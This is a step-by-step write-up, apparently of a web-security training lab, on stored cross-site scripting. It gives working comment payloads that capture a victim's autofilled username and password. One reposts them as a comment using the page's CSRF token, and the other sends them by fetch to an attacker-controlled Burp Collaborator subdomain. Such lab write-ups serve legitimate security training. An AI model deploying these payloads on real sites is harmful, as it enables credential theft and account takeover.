## Solution steps

- Open any blog post and write a comment to trigger an alert with random name and email.
- Notice that you can trigger an alert easily with this kind of payload: `<script>alert(1)</script>`
- But in this lab we have to steal victim's credentials, then use it to log in to the victim's account.
- This Lab has 2 solutions, one using Burp Collaborator and another without using Burp Collaborator. I will explain the steps without using burp collaborator as I don't have the premium version. But I will paste the another solution at the bottom from their official solution for your and my convenience :)

### Without using Burp Collaborator

- This solution is considered less subtle because this will make the victim post their credentials within a blog comment and every user visiting the page will be able to see it.
- Open Burp suite and set-up proxy (Keep intercept off).
- Post a random comment.
- From Http history, view `POST /post/comment` and notice that the request contains your session cookie and a `csrf` parameter.
- Copy the following payload and paste it as comment with random name and email:
  ```html
  <input type="text" name="username">
  <input type="password" name="password" onchange="hax()">

  <script>
  function hax() {
  var token = document.getElementsByName('csrf')[0].value;
  var username = document.getElementsByName('username')[0].value;
  var password = document.getElementsByName('password')[0].value;

  var data = new FormData();
  data.append('csrf',token)
  data.append('postId',5);
  data.append('comment',`${username}:${password}`);
  data.append('name','chris');
  data.append('email','chris@01.com');
  data.append('website','http://www.chris.com');

  fetch('/post/comment', {
  method: 'POST',
  mode: 'no-cors',
  body: data
  });
  }
  </script>

- Note: Change the postId parameter according to the post where you're commenting.
- Go back to the post and view that username and password is posted in this format: `username:password`.
- Log in using the credentials to complete the lab.
  
#### How the script works

- This script is designed to exfiltrate the victim’s username and password by leveraging a vulnerable comment form. The form fields `<input name="username">` and `<input name="password">` capture user credentials. When the user types a password, the onchange event triggers the `hax()` function.
- Inside `hax()`, the script extracts:
  - The CSRF token from a hidden input `(name="csrf")`,
  - The values of the username and password fields.
- It then constructs a `FormData` object, which includes:
  - The CSRF token,
  - The stolen credentials formatted as username:password in the comment field,
  - Dummy name, email, and website values.
- Finally, it sends this data using a `fetch()` request to the vulnerable site’s `/post/comment` endpoint. Since `mode: 'no-cors'` is used, the browser won’t block the request, though you won’t see a response in the console. The credentials are silently submitted and saved as a comment on the post.

### Using Burp collaborator

- Using Burp Suite Professional, go to the Collaborator tab.
- Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
- Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
  ```html
  <input name=username id=username>
  <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
  });">
- This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.
- Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
- Take a note of the value of the victim's username and password in the POST body.
- Use the credentials to log in as the victim user.
